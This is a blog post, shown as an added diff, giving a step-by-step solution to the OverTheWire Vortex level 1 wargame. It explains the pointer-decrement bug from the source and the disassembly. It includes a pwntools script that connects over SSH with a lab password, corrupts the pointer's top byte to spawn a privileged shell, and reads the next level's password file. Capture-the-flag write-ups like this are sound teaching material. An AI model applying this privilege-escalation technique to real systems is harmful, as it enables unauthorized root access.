@@ -1,0 +1,226 @@
+---
+layout: post
+title:  "Vortex Level 1"
+date:   2015-10-21 02:20
+categories: vortex wargame web overthewire
+author: Natri
+---
+This is a solution guide to the Vortex Level 01 at <a href="http://overthewire.org/wargames/vortex/vortex1.html">overthewire</a>. This write-up was created on 21 October 2015.
+<!--break-->
+
+1. Once logged in, navigate to /vortex/
+2. Execute program and see what a standard output gives
+3. Examine the source code given
+4. Write the exploit
+
+<h2>Standard Output</h2>
+{% highlight text %}
+./vortex1    
+aaaaaaaaaa
+[ 0 0 0 0 1 0 0 0 0 e0 fc f7 0 d0 ff f7 cb 6b fe f7 0 c0 ff f7 0 10 0 0 1 0 0 0 8c 6b fe f7 0 d0 ff f7 0 0 0 0 d8 d5 ff ff db 70 fe f7 f0 da ff f7 b8 e5 fc f7 1 0 0 0 1 0 0 0 0 0 0 0 ac 55 ff f7 0 0 0 0 0 0 0 0 5c d5 ff f7 a8 d5 ff ff c8 d5 ff ff 0 0 0 0 ac 55 ff f7 5c d5 ff f7 c8 d5 ff ff ac c4 fd f7 dc c2 fd f7 cd 4d fe f7 fd 5f e3 f7 ff 82 4 8 0 0 0 0 3c c3 fd f7 0 0 0 0 0 c0 fd f7 40 0 0 0 2 0 0 0 7d 82 4 8 24 dc ff f7 bc 26 e2 f7 0 d0 ff f7 b8 6c e2 f7 1 0 0 0 b8 e2 fc f7 24 55 fe f7 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 b8 e2 fc f7 3 0 0 0 f0 d5 ff ff 71 ea b1 7 2e 4e 3d f6 c8 6e e2 f7 f8 fb e2 f7 56 d ff f7 0 d0 ff f7 e2 f4 fd f7 5c d5 ff f7 f0 da ff f7 0 0 0 0 61 61 61 61 61 61 61 61 61 61 0 0 1 0 0 0 d3 8 0 0 e8 e2 fc f7 0 e0 fc f7 d4 82 4 8 38 4 e3 f7 5c 82 4 8 1 0 0 0 0 0 2 0 b6 2e ff f7 2 0 0 0 0 d0 ff f7 34 d7 ff ff f0 da ff f7 f0 d6 ff ff aa 57 fe f7 a0 d6 ff ff 5c 82 4 8 a8 d6 ff ff 94 da ff f7 0 0 0 0 e8 e2 fc f7 1 0 0 0 0 0 0 0 1 0 0 0 38 d9 ff f7 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 9 0 0 0 3f 0 c0 4 0 0 0 0 34 d7 ff ff a8 d6 ff ff a0 d6 ff ff d4 82 4 8 38 d9 ff f7 0 0 0 0 c2 0 0 0 b6 75 eb f7 ff ff ff ff ce d6 ff ff f8 fb e2 f7 53 5f e5 f7 0 0 0 0 0 0 ca 0 1 0 0 0 a9 83 4 8 bf d8 ff ff 2f 0 0 0 0 a0 4 8 22 87 4 8 1 0 0 0 94 d7 ff ff 9c d7 ff ff d 61 e5 f7 c4 a3 fc f7 0 d0 ff f7 db 86 4 8  ]
+{% endhighlight %}
+So we can see that it does input our 'aaaa' in the middle of the buffer as expected by the source code.
+
+<h2>Examine Source Code</h2>
+The end state is that we want the following code to run and in order to do that we need to make sure the unsigned integer value at ptr is 0xca000000 when AND with 0xff000000
+{% highlight c %}
+define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }
+{% endhighlight %}
+
+Looking at how the variables are declared:
+
+1. <strong>buf</strong> is an array of char
+2. <strong>ptr</strong> is a pointer to location of buf + half the size of buf; so esentially it is pointing to the 256th element in buf at the time of declaration [See indexing of pointers](http://boredzo.org/pointers/#indexing). Any time we call ptr we are getting an address value
+
+
+{% highlight c %}
+unsigned char buf[512];
+unsigned char *ptr = buf + (sizeof(buf)/2);
+unsigned int x;
+{% endhighlight %}
+
+What if we didn't have the source code, how would we find this vulnerability? Look at the disassembly of the code (see bottom section on 'Determining the stack')
+
+The vulnerability in this program is in the loop section of code.  There are three types of characters that can make an action happen:
+
+* <strong>A New Line</strong>
+   * This case is triggered when we press return
+   * Will print out what is in <strong>buf</strong>
+* <strong>Backslash '\\'</strong>
+   * Decriments <strong>ptr</strong>
+   * This is good because <strong>ptr</strong> is a pointer and by decrimenting it the address decriments
+   * <strong>KEY: </strong>It is this code that is going to allow us to do a buffer overflow at the bottom of the stack
+* <strong>Anything Else</strong>
+   * Executes the <strong>e()</strong> function
+   * Checks to see if <strong>ptr</strong> has gone pass <strong>buf</strong> array size; to prevent buffer overflow at the top of the stack
+   * Writes the value of current char into the address <strong>ptr</strong> is currently at; this is how we are going to get <strong>0xca</strong> into the stack
+
+{% highlight c linenos %}
+while((x = getchar()) != EOF) {
+   switch(x) {
+      case '\n': print(buf, sizeof(buf)); continue; break;
+      case '\\': ptr--; break;
+      default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
+   }
+}
+{% endhighlight %}
+
+<h2>Write the expliot</h2>
+We have all the tools we need to take advantage of the buffer overflow at the bottom of the stack.
+
+1. Determine where to write
+2. Take <strong>ptr</strong> to that point
+3. Write the value <strong>0xca</strong>
+3. Get the function <strong>e()</strong> to execute
+4. Grab the flag
+
+{% highlight python linenos %}
+from pwn import *
+import time
+
+HOST = 'votex.labs.overthewire.org'
+USERNAME = 'vortex1'
+PASS = 'Gq#qu3bF3'
+
+s = ssh(host=HOST, user=USERNAME, password=PASS)
+
+location = "/vortex"
+file_name = '%s/vortex1' % location
+password_file = '/etc/vortex_pass/vortex2'
+r = s.run(file_name)
+
+#need to overwrite the MSB of the ptr variable; through stack analysis I found this
+buff_size = 512
+ptr_loc = buff_size / 2
+getchar_size = 4
+
+#location of where we want to write 0xca so we can pass the if statement and setresuid
+where_to_write = ptr_loc + getchar_size + 1
+
+r.send('\\' * where_to_write) #move ptr to the place we want to write
+r.send('\xca') #write the value we want
+r.send('\\') #send the pointer back one
+r.send('\xff') #this value doesn't matter just want to make sure the case that initiates function e() gets triggered
+
+#get rid of any junk from the buffer
+r.clean()
+
+#give time for hack to work
+time.sleep(1)
+
+r.sendline('cat %s' % password_file) #read the password file
+log.success('Password: %s' % r.recv().strip()) #log the password on screen
+
+{% endhighlight %}
+<h2>Determining the Stack</h2>
+To find out vulnerabilities to smash the stack we need to see how the stack is made and utilized.  Looking at the disassembly of the main procedure below lets build the stack:
+
+1. 080485c8: makes the stack 0x220 in size
+2. 080485ce and 080485d4: creates the [stack canary](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/) to ensure the top of the stack doesn't get corrupted; so since it puts an address at esp+0x21c that is the 0x4 size needed for an address of 32-bit address
+3. Set the <strong>ptr</strong> address:
+   1. 080485dd: grabs the memory location of the buffer array
+   2. 080485e1: takes memory address and adds 0x100 (this is 256 decimal which is half the buffer size; matches source code)
+   3. 080485e6: Puts that value onto the stack
+4. 0804868e and 08048693: the <strong>getchar</strong> c function is called and value is stored in stack at memory location esp+0x18
+5. Interesting to note that only pointers are stored on the stack as can be seen by [ss:esp+x]
+4. Now our stack looks like this
+
+
+| Variable | Position on the stack (esp + x) | stack size | notes |
+| ptr | 0x14 | 4 | initial value should be [buf+0x100] |
+| getchar value | 0x18 | 0x4 |
+| buf variable | 0x1c | 0x200 |
+| canary | 0x21c | 4 |
+
+So now we know what the stack looks like so we can manipulate it.  So we need to set the value in <strong>ptr</strong> and can do so by manipulating <strong>ptr</strong> until we get to where we can modify the MSB of <strong>ptr</strong>.  So <strong>ptr</strong> starts at 0x11c (0x1c + 0x100) and we want to get to 0x17 (MSB of <strong>ptr</strong> since words/addresses are read in reverse order) therefore we want to go back 0x105 (261).
+
+{% highlight text linenos %}
+main:
+080485c0         push       ebp                                                 ; XREF=_start+23
+080485c1         mov        ebp, esp
+080485c3         push       esi
+080485c4         push       ebx
+080485c5         and        esp, 0xfffffff0
+080485c8         sub        esp, 0x220
+080485ce         mov        eax, dword [gs:0x14]
+080485d4         mov        dword [ss:esp+0x21c], eax
+080485db         xor        eax, eax
+080485dd         lea        eax, dword [ss:esp+0x1c]
+080485e1         add        eax, 0x100
+080485e6         mov        dword [ss:esp+0x14], eax
+080485ea         jmp        0x804868e
+
+080485ef         mov        eax, dword [ss:esp+0x18]                            ; XREF=main+220
+080485f3         cmp        eax, 0xa
+080485f6         je         0x80485ff
+
+080485f8         cmp        eax, 0x5c
+080485fb         je         0x8048615
+
+080485fd         jmp        0x804861c
+
+080485ff         mov        dword [ss:esp+0x4], 0x200                           ; argument #2 for method print, XREF=main+54
+08048607         lea        eax, dword [ss:esp+0x1c]
+0804860b         mov        dword [ss:esp], eax                                 ; argument #1 for method print
+0804860e         call       print
+08048613         jmp        0x804868e
+
+08048615         sub        dword [ss:esp+0x14], 0x1                            ; ptr back one, XREF=main+59
+0804861a         jmp        0x804868e
+
+0804861c         mov        eax, dword [ss:esp+0x14]                            ; XREF=main+61
+08048620         and        eax, 0xff000000
+08048625         cmp        eax, 0xca000000
+0804862a         jne        0x804866b
+
+0804862c         call       j_geteuid
+08048631         mov        esi, eax
+08048633         call       j_geteuid
+08048638         mov        ebx, eax
+0804863a         call       j_geteuid
+0804863f         mov        dword [ss:esp+0x8], esi
+08048643         mov        dword [ss:esp+0x4], ebx
+08048647         mov        dword [ss:esp], eax
+0804864a         call       j_setresuid
+0804864f         mov        dword [ss:esp+0x8], 0x0
+08048657         mov        dword [ss:esp+0x4], 0x804876a                       ; argument "arg0" for method j_execlp
+0804865f         mov        dword [ss:esp], 0x804876d                           ; "/bin/sh", argument "file" for method j_execlp
+08048666         call       j_execlp
+
+0804866b         lea        eax, dword [ss:esp+0x1c]                            ; XREF=main+106
+0804866f         add        eax, 0x200
+08048674         cmp        dword [ss:esp+0x14], eax
+08048678         jbe        0x804867c
+
+0804867a         jmp        0x804868d
+
+0804867c         mov        eax, dword [ss:esp+0x14]                            ; XREF=main+184
+08048680         lea        edx, dword [ds:eax+0x1]
+08048683         mov        dword [ss:esp+0x14], edx
+08048687         mov        edx, dword [ss:esp+0x18]
+0804868b         mov        byte [ds:eax], dl
+
+0804868d         nop                                                            ; XREF=main+186
+
+0804868e         call       j_getchar                                           ; XREF=main+42, main+83, main+90
+08048693         mov        dword [ss:esp+0x18], eax
+08048697         cmp        dword [ss:esp+0x18], 0xffffffff
+0804869c         jne        0x80485ef
+
+080486a2         mov        dword [ss:esp], 0x8048775                           ; "All done", argument "s" for method j_puts
+080486a9         call       j_puts
+080486ae         mov        eax, 0x0
+080486b3         mov        ecx, dword [ss:esp+0x21c]
+080486ba         xor        ecx, dword [gs:0x14]
+080486c1         je         0x80486c8
+
+080486c3         call       j___stack_chk_fail
+
+080486c8         lea        esp, dword [ss:ebp+var_8]                           ; XREF=main+257
+080486cb         pop        ebx
+080486cc         pop        esi
+080486cd         pop        ebp
+080486ce         ret        
+           ; endp
+080486cf         nop        
+{% endhighlight %}
